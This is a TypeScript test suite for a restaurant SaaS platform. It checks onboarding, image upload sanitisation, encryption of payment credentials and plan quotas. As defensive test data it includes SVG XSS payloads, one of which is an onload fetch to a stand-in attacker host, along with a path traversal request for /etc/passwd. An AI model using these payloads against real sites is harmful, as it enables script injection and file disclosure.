/**
 * 🧪 RestaurantOS Owner Self-Service, Secure Uploads & Quota Enforcement Test Suite
 * ─────────────────────────────────────────────────────────────────────────────
 * Complete verification of:
 * 1. Onboarding checklist state machine & dynamic percentage computation.
 * 2. Secure image sniffing engine (PNG, JPEG, WEBP, SVG sanitization, size limit).
 * 3. AES-256-GCM Razorpay credentials encryption & cross-tenant isolation.
 * 4. Subscription plan limits & quota enforcement (warnings at 80%, blocks at 100%).
 * 5. Live HTTP endpoints (/uploads/*, /api/restaurant/onboarding, /api/restaurant/uploads/*,
 *    /api/restaurant/payments/config, /api/restaurant/tables quota).
 */

import * as http from 'http';
import * as crypto from 'crypto';
import * as fs from 'fs';
import * as path from 'path';
import { PrismaClient } from '@prisma/client';
import {
  TenantProvisioningService,
  OwnerSelfService,
  OnboardingStepKey,
  ALL_ONBOARDING_STEPS,
  PLAN_TIER_LIMITS,
  issueStaffToken,
} from '../packages/domain';

const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://apple@localhost:5432/restaurant_os';
const TEST_PLATFORM_TOKEN = 'test_platform_token_secret_key_1234567890123456';
const prisma = new PrismaClient({ datasources: { db: { url: DATABASE_URL } } });

function assert(condition: boolean, message: string): void {
  if (!condition) {
    console.error(`  ❌ FAIL: ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  console.log(`  ✅ PASS: ${message}`);
}

async function makeRequest(
  port: number,
  method: string,
  reqPath: string,
  headers: Record<string, string>,
  body?: any,
  rawBuffer?: Buffer
): Promise<{ status: number; headers: http.IncomingHttpHeaders; body: any }> {
  return new Promise((resolve, reject) => {
    const reqHeaders: Record<string, string> = { ...headers };
    let payloadBuffer: Buffer | null = null;

    if (rawBuffer) {
      payloadBuffer = rawBuffer;
      reqHeaders['Content-Length'] = String(rawBuffer.length);
    } else if (body) {
      const dataStr = typeof body === 'string' ? body : JSON.stringify(body);
      payloadBuffer = Buffer.from(dataStr, 'utf8');
      if (!reqHeaders['Content-Type']) {
        reqHeaders['Content-Type'] = 'application/json';
      }
      reqHeaders['Content-Length'] = String(payloadBuffer.length);
    }

    const req = http.request(
      {
        hostname: '127.0.0.1',
        port,
        path: reqPath,
        method,
        headers: reqHeaders,
      },
      (res) => {
        const chunks: Buffer[] = [];
        res.on('data', (c) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
        res.on('end', () => {
          const combined = Buffer.concat(chunks);
          let parsed: any = null;
          try {
            parsed = JSON.parse(combined.toString('utf8'));
          } catch {
            parsed = combined.toString('utf8');
          }
          resolve({ status: res.statusCode || 500, headers: res.headers, body: parsed });
        });
      }
    );

    req.on('error', reject);
    if (payloadBuffer) {
      req.write(payloadBuffer);
    }
    req.end();
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// Sample image generators for binary sniffing
// ─────────────────────────────────────────────────────────────────────────────

// Minimal valid PNG buffer
const VALID_PNG_BUFFER = Buffer.from([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, // PNG Signature
  0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52, // IHDR chunk
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
  0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
  0x89, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4e,
  0x44, 0xae, 0x42, 0x60, 0x82,
]);

// Minimal valid JPEG buffer
const VALID_JPEG_BUFFER = Buffer.from([
  0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46,
  0x49, 0x46, 0x00, 0x01, 0x01, 0x01, 0x00, 0x48,
  0x00, 0x48, 0x00, 0x00, 0xff, 0xd9,
]);

// Minimal valid WEBP buffer
const VALID_WEBP_BUFFER = Buffer.concat([
  Buffer.from('RIFF', 'ascii'),
  Buffer.from([0x18, 0x00, 0x00, 0x00]), // size
  Buffer.from('WEBP', 'ascii'),
  Buffer.from('VP8 ', 'ascii'),
  Buffer.from([0x0a, 0x00, 0x00, 0x00]),
  Buffer.from([0x30, 0x01, 0x00, 0x9d, 0x01, 0x2a, 0x01, 0x00, 0x01, 0x00]),
]);

// Safe SVG
const SAFE_SVG_BUFFER = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#C86B3C"/></svg>`,
  'utf8'
);

// Malicious SVGs
const MALICIOUS_SCRIPT_SVG = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg"><script>alert("xss")</script><rect width="100" height="100"/></svg>`,
  'utf8'
);
const MALICIOUS_ONLOAD_SVG = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com')"><circle r="10"/></svg>`,
  'utf8'
);
const MALICIOUS_JAVASCRIPT_URL_SVG = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>Click</text></a></svg>`,
  'utf8'
);
const MALICIOUS_FOREIGNOBJECT_SVG = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>`,
  'utf8'
);

async function main() {
  console.log('🍷 RestaurantOS Owner Self-Service & Quota Enforcement Test Suite');
  console.log('=================================================================\n');

  const provisioning = new TenantProvisioningService(prisma, 'orbitox.live');
  const ownerService = new OwnerSelfService(prisma);

  const testSuffix = Date.now().toString(36);
  const testTenantId = `tenant_selfservice_${testSuffix}`;
  const testSlug = `selfservice-${testSuffix}`;

  // Provision clean starter tenant
  console.log('--- Setup: Provisioning Clean Tenant ---');
  const provisionResult = await provisioning.provisionTenant({
    restaurantName: 'Self-Service Test Bistro',
    slug: testSlug,
    templateId: 'tmpl_starter_bistro',
    planId: 'starter',
    ownerEmail: `owner-${testSuffix}@testbistro.com`,
    ownerName: 'Owner Test',
    currency: 'INR',
    timezone: 'Asia/Kolkata',
  });
  assert(provisionResult.tenantId.length > 0, `Tenant created: ${provisionResult.tenantId}`);

  // ─────────────────────────────────────────────────────────────────────────────
  // Suite 1: Onboarding Checklist State Machine
  // ─────────────────────────────────────────────────────────────────────────────
  console.log('\n--- Suite 1: Onboarding Checklist State Machine ---');

  // 1.1 Initial onboarding state
  const stateInitial = await ownerService.getOnboardingState(provisionResult.tenantId);
  assert(stateInitial.completedStepsCount === 0, 'Initial state: 0 completed steps');
  assert(stateInitial.totalStepsCount === 6, 'Total steps is 6');
  assert(stateInitial.percentComplete === 0, 'Initial percentComplete is 0%');
  assert(stateInitial.isFullyOnboarded === false, 'Initial isFullyOnboarded is false');

  // 1.2 Step progression
  const stepKeys: OnboardingStepKey[] = [
    'CLAIM_INVITE',
    'SET_PIN',
    'BRANDING_CONFIGURED',
    'MENU_CUSTOMIZED',
    'TABLES_REVIEWED',
    'PAYMENTS_CONNECTED',
  ];

  let expectedPercent = [17, 33, 50, 67, 83, 100];
  for (let i = 0; i < stepKeys.length; i++) {
    const step = stepKeys[i];
    const updated = await ownerService.updateOnboardingStep(provisionResult.tenantId, step, true);
    assert(updated.steps[step] === true, `Step ${step} marked true`);
    assert(updated.completedStepsCount === i + 1, `Completed steps count: ${i + 1}`);
    assert(updated.percentComplete === expectedPercent[i], `Percentage complete: ${expectedPercent[i]}%`);
  }

  // 1.3 Fully onboarded flag
  const stateFull = await ownerService.getOnboardingState(provisionResult.tenantId);
  assert(stateFull.isFullyOnboarded === true, 'All 6 steps complete: isFullyOnboarded is true');
  assert(stateFull.percentComplete === 100, 'Percent complete is 100%');

  // 1.4 Setting a step to false drops percentage
  const stateDropped = await ownerService.updateOnboardingStep(
    provisionResult.tenantId,
    'PAYMENTS_CONNECTED',
    false
  );
  assert(stateDropped.steps.PAYMENTS_CONNECTED === false, 'PAYMENTS_CONNECTED set to false');
  assert(stateDropped.isFullyOnboarded === false, 'isFullyOnboarded flips back to false');
  assert(stateDropped.completedStepsCount === 5, 'Completed count dropped to 5');
  assert(stateDropped.percentComplete === 83, 'Percent complete dropped to 83%');

  // 1.5 Invalid step rejection
  let invalidStepFailed = false;
  try {
    await ownerService.updateOnboardingStep(provisionResult.tenantId, 'INVALID_STEP' as any, true);
  } catch (err: any) {
    invalidStepFailed = err.message.includes('Invalid onboarding step');
  }
  assert(invalidStepFailed, 'Invalid onboarding step throws error');

  // ─────────────────────────────────────────────────────────────────────────────
  // Suite 2: Secure Image Upload & Sniffing Engine
  // ─────────────────────────────────────────────────────────────────────────────
  console.log('\n--- Suite 2: Secure Image Sniffing & Upload Engine ---');

  // 2.1 Valid formats pass
  const validPngResult = ownerService.validateAndSanitizeImage(VALID_PNG_BUFFER);
  assert(validPngResult.mimeType === 'image/png' && validPngResult.extension === 'png', 'Valid PNG sniffed');

  const validJpegResult = ownerService.validateAndSanitizeImage(VALID_JPEG_BUFFER);
  assert(validJpegResult.mimeType === 'image/jpeg' && validJpegResult.extension === 'jpg', 'Valid JPEG sniffed');

  const validWebpResult = ownerService.validateAndSanitizeImage(VALID_WEBP_BUFFER);
  assert(validWebpResult.mimeType === 'image/webp' && validWebpResult.extension === 'webp', 'Valid WEBP sniffed');

  const validSvgResult = ownerService.validateAndSanitizeImage(SAFE_SVG_BUFFER);
  assert(validSvgResult.mimeType === 'image/svg+xml' && validSvgResult.extension === 'svg', 'Safe SVG sniffed');

  // 2.2 Corrupt / disguised buffer rejection
  let disguisedFailed = false;
  try {
    ownerService.validateAndSanitizeImage(Buffer.from('MZ\x90\x00\x03\x00\x00\x00WindowsExecutablePayload'));
  } catch (err: any) {
    disguisedFailed = err.message.includes('UNSUPPORTED_IMAGE_FORMAT');
  }
  assert(disguisedFailed, 'Disguised non-image binary rejected as UNSUPPORTED_IMAGE_FORMAT');

  // 2.3 File size limit > 2MB
  const oversizeBuffer = Buffer.alloc(2 * 1024 * 1024 + 1024, 0x89);
  let oversizeFailed = false;
  try {
    ownerService.validateAndSanitizeImage(oversizeBuffer);
  } catch (err: any) {
    oversizeFailed = err.message.includes('IMAGE_TOO_LARGE');
  }
  assert(oversizeFailed, 'Oversized image (>2MB) rejected as IMAGE_TOO_LARGE');

  // 2.4 SVG XSS sanitization tests
  const maliciousSvgs = [
    { name: '<script> tag', buf: MALICIOUS_SCRIPT_SVG },
    { name: 'onload= handler', buf: MALICIOUS_ONLOAD_SVG },
    { name: 'javascript: href', buf: MALICIOUS_JAVASCRIPT_URL_SVG },
    { name: '<foreignObject> construct', buf: MALICIOUS_FOREIGNOBJECT_SVG },
  ];

  for (const { name, buf } of maliciousSvgs) {
    let xssBlocked = false;
    try {
      ownerService.validateAndSanitizeImage(buf);
    } catch (err: any) {
      xssBlocked = err.message.includes('SECURITY_VIOLATION');
    }
    assert(xssBlocked, `Malicious SVG with ${name} rejected as SECURITY_VIOLATION`);
  }

  // 2.5 Image storage & automatic brand configuration hook
  const savedLogo = await ownerService.saveTenantImage(provisionResult.tenantId, VALID_PNG_BUFFER, 'logo');
  assert(savedLogo.url.startsWith(`/uploads/${provisionResult.tenantId}/logo_`), `Logo saved to ${savedLogo.url}`);
  assert(fs.existsSync(savedLogo.filePath), `File exists on filesystem at ${savedLogo.filePath}`);

  // Verify onboarding state updated BRANDING_CONFIGURED
  const stateAfterLogo = await ownerService.getOnboardingState(provisionResult.tenantId);
  assert(stateAfterLogo.steps.BRANDING_CONFIGURED === true, 'Uploading logo auto-marked BRANDING_CONFIGURED');

  // ─────────────────────────────────────────────────────────────────────────────
  // Suite 3: AES-256-GCM Razorpay Credentials Encryption & Tenant Isolation
  // ─────────────────────────────────────────────────────────────────────────────
  console.log('\n--- Suite 3: AES-256-GCM Razorpay Credentials Encryption & Isolation ---');

  const testKeyId = 'rzp_live_K82jD84ls91zP';
  const testKeySecret = 'secret_k19F83jL92kP01';
  const testWebhookSecret = 'whsec_9201kx837261a';

  // 3.1 Encryption output format (iv:ciphertext:tag)
  const encryptedPayload = ownerService.encryptSecret(testKeySecret, provisionResult.tenantId);
  const parts = encryptedPayload.split(':');
  assert(parts.length === 3, 'Encrypted secret formatted as iv:ciphertext:tag');
  assert(parts[0].length === 24, 'IV is 96-bit (24 hex characters)');
  assert(parts[2].length === 32, 'GCM auth tag is 128-bit (32 hex characters)');

  // 3.2 Decryption fidelity
  const decryptedSecret = ownerService.decryptSecret(encryptedPayload, provisionResult.tenantId);
  assert(decryptedSecret === testKeySecret, 'Decrypted secret matches original plaintext exactly');

  // 3.3 Multi-tenant cryptographic isolation
  const otherTenantId = `tenant_other_${testSuffix}`;
  let crossTenantDecryptionFailed = false;
  try {
    ownerService.decryptSecret(encryptedPayload, otherTenantId);
  } catch (err) {
    crossTenantDecryptionFailed = true;
  }
  assert(
    crossTenantDecryptionFailed,
    'Cross-tenant isolation: Tenant B cannot decrypt Tenant A ciphertexts (auth tag mismatch)'
  );

  // 3.4 Save and retrieve payment credentials
  const savePaymentRes = await ownerService.savePaymentConfig(provisionResult.tenantId, {
    keyId: testKeyId,
    keySecret: testKeySecret,
    webhookSecret: testWebhookSecret,
    gstin: '03AAAAA0000A1Z5',
    legalEntityName: 'Test Bistro Private Limited',
  });
  assert(savePaymentRes.success === true, 'Payment config saved successfully');
  assert(savePaymentRes.maskedKeyId === 'rzp_live...91zP', `Masked keyId returned: ${savePaymentRes.maskedKeyId}`);

  // 3.5 Masked vs unmasked retrieval
  const maskedConfig = await ownerService.getPaymentConfig(provisionResult.tenantId, false);
  assert(maskedConfig.configured === true, 'Configured flag is true');
  assert(maskedConfig.keyId === 'rzp_live...91zP', 'Default getPaymentConfig returns masked keyId');
  assert(maskedConfig.keySecret === undefined, 'Default getPaymentConfig hides keySecret');

  const unmaskedConfig = await ownerService.getPaymentConfig(provisionResult.tenantId, true);
  assert(unmaskedConfig.keyId === testKeyId, 'Unmasked getter returns raw keyId');
  assert(unmaskedConfig.keySecret === testKeySecret, 'Unmasked getter returns raw keySecret');
  assert(unmaskedConfig.webhookSecret === testWebhookSecret, 'Unmasked getter returns raw webhookSecret');

  // Check onboarding step
  const stateAfterPayment = await ownerService.getOnboardingState(provisionResult.tenantId);
  assert(stateAfterPayment.steps.PAYMENTS_CONNECTED === true, 'Saving payment config auto-marked PAYMENTS_CONNECTED');

  // ─────────────────────────────────────────────────────────────────────────────
  // Suite 4: Subscription Plan Limits & Quota Enforcement Engine
  // ─────────────────────────────────────────────────────────────────────────────
  console.log('\n--- Suite 4: Plan Limits & Quota Enforcement Engine ---');

  // Starter limits: 10 tables, 500 monthly orders
  const checkInitialTables = await ownerService.checkPlanLimits(provisionResult.tenantId, 'TABLES');
  assert(checkInitialTables.allowed === true, 'Initial table count (3 from starter template) within quota');
  assert(checkInitialTables.max === 10, 'Starter plan max tables is 10');
  assert(checkInitialTables.warning === false, 'Below 80% quota emits warning: false');

  // Test 80% soft warning (8 tables on starter plan = 80%)
  // Seed tables to reach 8
  const currentTablesCount = await prisma.tableFloor.count({ where: { tenantId: provisionResult.tenantId } });
  for (let i = currentTablesCount; i < 8; i++) {
    await prisma.tableFloor.create({
      data: {
        id: `tbl_${testSuffix}_${i}`,
        tenantId: provisionResult.tenantId,
        branchId: provisionResult.branchId,
        floorId: 'fl_courtyard',
        number: `T-QUOTA-${i + 1}`,
        capacity: 4,
        status: 'AVAILABLE',
        locator: `loc_${i}`,
      },
    });
  }

  const check80Percent = await ownerService.checkPlanLimits(provisionResult.tenantId, 'TABLES');
  assert(check80Percent.allowed === true, '80% quota: creation still allowed');
  assert(check80Percent.warning === true, '80% quota: warning flag is true');
  assert(check80Percent.percentage === 80, `Percentage is 80% (${check80Percent.current}/${check80Percent.max})`);

  // Fill up to 10 tables (100% quota)
  for (let i = 8; i < 10; i++) {
    await prisma.tableFloor.create({
      data: {
        id: `tbl_${testSuffix}_${i}`,
        tenantId: provisionResult.tenantId,
        branchId: provisionResult.branchId,
        floorId: 'fl_courtyard',
        number: `T-QUOTA-${i + 1}`,
        capacity: 4,
        status: 'AVAILABLE',
        locator: `loc_${i}`,
      },
    });
  }

  // Attempting to add 1 table when already at 10/10 must fail
  const check100Percent = await ownerService.checkPlanLimits(provisionResult.tenantId, 'TABLES', 1);
  assert(check100Percent.allowed === false, '100% quota exceeded: allowed is false');
  assert(check100Percent.error?.includes('PLAN_LIMIT_EXCEEDED'), 'Error mentions PLAN_LIMIT_EXCEEDED');

  // Growth plan upgrade unlocks limit
  await prisma.tenant.update({
    where: { id: provisionResult.tenantId },
    data: { planId: 'growth' },
  });
  const checkGrowth = await ownerService.checkPlanLimits(provisionResult.tenantId, 'TABLES', 1);
  assert(checkGrowth.allowed === true, 'After upgrading to growth plan, table creation is allowed');
  assert(checkGrowth.max === 30, 'Growth plan max tables expanded to 30');
  assert(checkGrowth.warning === false, '10/30 (33%) is well below 80% warning threshold');

  // Reset to starter plan for subsequent tests
  await prisma.tenant.update({
    where: { id: provisionResult.tenantId },
    data: { planId: 'starter' },
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // Suite 5: Live HTTP Server Endpoints & Traffic Integration
  // ─────────────────────────────────────────────────────────────────────────────
  console.log('\n--- Suite 5: Live HTTP Server Endpoints & Traffic Integration ---');
  const serverPort = 4024;
  const { spawn } = await import('child_process');
  const serverProc = spawn('npx', ['tsx', 'src/server.ts'], {
    cwd: process.cwd(),
    env: {
      ...process.env,
      PORT: String(serverPort),
      DATABASE_URL,
      RESTAURANTOS_PLATFORM_TOKEN: TEST_PLATFORM_TOKEN,
      NODE_ENV: 'test',
    },
    stdio: 'pipe',
  });

  let serverReady = false;
  for (let i = 0; i < 40; i++) {
    try {
      const ping = await makeRequest(serverPort, 'GET', '/health', {});
      if (ping.status === 200) {
        serverReady = true;
        break;
      }
    } catch {}
    await new Promise((r) => setTimeout(r, 250));
  }
  assert(serverReady, `Live test server running on port ${serverPort}`);

  const tenantHost = `${testSlug}.orbitox.live`;
  const staffToken = issueStaffToken({
    sub: 'stf_mgr_selfservice',
    name: 'Manager SelfService',
    role: 'MANAGER',
    tenantId: provisionResult.tenantId,
    branchId: '*',
  });

  try {
    // 5.1 Static file serving
    const staticRes = await makeRequest(serverPort, 'GET', savedLogo.url, {
      Host: tenantHost,
    });
    assert(staticRes.status === 200, `GET ${savedLogo.url} returns HTTP 200 OK`);
    assert(staticRes.headers['content-type'] === 'image/png', 'Static asset served with image/png');
    assert(
      staticRes.headers['x-content-type-options'] === 'nosniff',
      'Static asset served with X-Content-Type-Options: nosniff'
    );

    // 5.2 Directory traversal protection
    const traversalRes = await makeRequest(serverPort, 'GET', '/uploads/../../etc/passwd', {
      Host: tenantHost,
    });
    assert(traversalRes.status === 404, 'Path traversal (/uploads/../../etc/passwd) rejected with HTTP 404');

    // 5.3 Onboarding state via HTTP
    const httpOnboarding = await makeRequest(serverPort, 'GET', '/api/restaurant/onboarding', {
      Host: tenantHost,
      Authorization: `Bearer ${staffToken}`,
    });
    assert(httpOnboarding.status === 200, 'GET /api/restaurant/onboarding returns HTTP 200');
    assert(httpOnboarding.body.onboarding !== undefined, 'Body contains onboarding object');

    // 5.4 Update onboarding step via HTTP
    const httpStepUpdate = await makeRequest(
      serverPort,
      'POST',
      '/api/restaurant/onboarding/step',
      {
        Host: tenantHost,
        Authorization: `Bearer ${staffToken}`,
      },
      { step: 'MENU_CUSTOMIZED', completed: true }
    );
    assert(httpStepUpdate.status === 200, 'POST /api/restaurant/onboarding/step returns HTTP 200');
    assert(httpStepUpdate.body.onboarding.steps.MENU_CUSTOMIZED === true, 'Step MENU_CUSTOMIZED marked true');

    // 5.5 Logo upload via base64 JSON payload
    const base64Png = VALID_PNG_BUFFER.toString('base64');
    const httpUploadLogo = await makeRequest(
      serverPort,
      'POST',
      '/api/restaurant/uploads/logo',
      {
        Host: tenantHost,
        Authorization: `Bearer ${staffToken}`,
      },
      { image: `data:image/png;base64,${base64Png}` }
    );
    assert(httpUploadLogo.status === 200, 'POST /api/restaurant/uploads/logo (base64) returns HTTP 200');
    assert(httpUploadLogo.body.data.url.startsWith(`/uploads/${provisionResult.tenantId}/logo_`), 'URL returned');

    // 5.6 Malicious SVG upload rejection via HTTP
    const httpMaliciousUpload = await makeRequest(
      serverPort,
      'POST',
      '/api/restaurant/uploads/logo',
      {
        Host: tenantHost,
        Authorization: `Bearer ${staffToken}`,
      },
      { image: `data:image/svg+xml;base64,${MALICIOUS_SCRIPT_SVG.toString('base64')}` }
    );
    assert(
      httpMaliciousUpload.status === 400,
      'POST /api/restaurant/uploads/logo with malicious SVG returns HTTP 400'
    );
    assert(
      httpMaliciousUpload.body.error === 'SECURITY_VIOLATION',
      'Error code is SECURITY_VIOLATION'
    );

    // 5.7 Razorpay payment configuration via HTTP
    const httpSavePayments = await makeRequest(
      serverPort,
      'POST',
      '/api/restaurant/payments/config',
      {
        Host: tenantHost,
        Authorization: `Bearer ${staffToken}`,
      },
      {
        keyId: 'rzp_live_abc123xyz789',
        keySecret: 'secret_live_supersecret',
        webhookSecret: 'whsec_secret123',
        gstin: '07AAAAA1111A1Z1',
        legalEntityName: 'Bistro Foods LLP',
      }
    );
    assert(httpSavePayments.status === 200, 'POST /api/restaurant/payments/config returns HTTP 200');
    assert(httpSavePayments.body.maskedKeyId === 'rzp_live...z789', 'Masked keyId returned');

    // 5.8 Fetch masked payment configuration via HTTP
    const httpGetPayments = await makeRequest(serverPort, 'GET', '/api/restaurant/payments/config', {
      Host: tenantHost,
      Authorization: `Bearer ${staffToken}`,
    });
    assert(httpGetPayments.status === 200, 'GET /api/restaurant/payments/config returns HTTP 200');
    assert(httpGetPayments.body.paymentConfig.keyId === 'rzp_live...z789', 'Key ID is masked in response');
    assert(httpGetPayments.body.paymentConfig.keySecret === undefined, 'Key secret is omitted in masked response');

    // 5.9 Table creation quota block via HTTP (tenant is at 10/10 tables on starter plan)
    const httpCreateTableBlocked = await makeRequest(
      serverPort,
      'POST',
      '/api/restaurant/tables',
      {
        Host: tenantHost,
        Authorization: `Bearer ${staffToken}`,
      },
      {
        number: 'T-QUOTA-OVERFLOW',
        capacity: 4,
      }
    );
    assert(
      httpCreateTableBlocked.status === 403,
      'POST /api/restaurant/tables beyond quota returns HTTP 403 Forbidden'
    );
    assert(
      httpCreateTableBlocked.body.code === 'PLAN_LIMIT_EXCEEDED',
      'Response code is PLAN_LIMIT_EXCEEDED'
    );

    // 5.10 Order quota warning & blockage via HTTP
    const now = new Date();
    const orderItemsJson = [{ id: 'item_butter_chicken', name: 'Butter Chicken', quantity: 1, unitPriceMinor: 54000, station: 'CURRY_LINE' }];
    const batchOrders = [];
    for (let i = 0; i < 400; i++) {
      batchOrders.push({
        id: `ord_quota_${testSuffix}_${i}`,
        tenantId: provisionResult.tenantId,
        branchId: provisionResult.branchId,
        tableNumber: 'T-01',
        sessionId: `sess_quota_${testSuffix}`,
        status: 'PAID',
        items: orderItemsJson,
        subtotalMinor: 54000,
        taxMinor: 2700,
        totalMinor: 56700,
        currency: 'INR',
        createdAt: now,
      });
    }
    await prisma.restaurantOrder.createMany({ data: batchOrders });

    const orderWarningRes = await makeRequest(
      serverPort,
      'POST',
      '/api/restaurant/orders',
      {
        Host: tenantHost,
        Authorization: `Bearer ${staffToken}`,
      },
      {
        tableNumber: 'T-01',
        items: [{ id: 'item_butter_chicken', quantity: 1 }],
      }
    );
    assert(orderWarningRes.status === 201, 'Order submitted successfully at 80% quota (HTTP 201)');
    assert(orderWarningRes.headers['x-quota-warning'] === '80%', 'Order response contains x-quota-warning: 80%');

    // Add remaining 100 orders to hit 500 (100% quota)
    const blockOrders = [];
    for (let i = 400; i < 500; i++) {
      blockOrders.push({
        id: `ord_quota_${testSuffix}_${i}`,
        tenantId: provisionResult.tenantId,
        branchId: provisionResult.branchId,
        tableNumber: 'T-01',
        sessionId: `sess_quota_${testSuffix}`,
        status: 'PAID',
        items: orderItemsJson,
        subtotalMinor: 54000,
        taxMinor: 2700,
        totalMinor: 56700,
        currency: 'INR',
        createdAt: now,
      });
    }
    await prisma.restaurantOrder.createMany({ data: blockOrders });

    const orderBlockedRes = await makeRequest(
      serverPort,
      'POST',
      '/api/restaurant/orders',
      {
        Host: tenantHost,
        Authorization: `Bearer ${staffToken}`,
      },
      {
        tableNumber: 'T-01',
        items: [{ id: 'item_butter_chicken', quantity: 1 }],
      }
    );
    assert(orderBlockedRes.status === 403, 'Order rejected at 100% quota with HTTP 403');
    assert(orderBlockedRes.body.code === 'PLAN_LIMIT_EXCEEDED', 'Order error code is PLAN_LIMIT_EXCEEDED');

  } finally {
    serverProc.kill();
  }

  // Cleanup test tenant
  console.log('\n--- Teardown: Cleaning Test Tenant ---');
  try {
    await prisma.tenant.delete({ where: { id: provisionResult.tenantId } });
    console.log('  Cleaned up test tenant.');
  } catch (e) {}

  await prisma.$disconnect();
  console.log('\n🎉 ALL OWNER SELF-SERVICE & QUOTA TESTS PASSED PERFECTLY!');
}

main().catch((err) => {
  console.error('\n❌ Test execution failed:', err);
  process.exit(1);
});
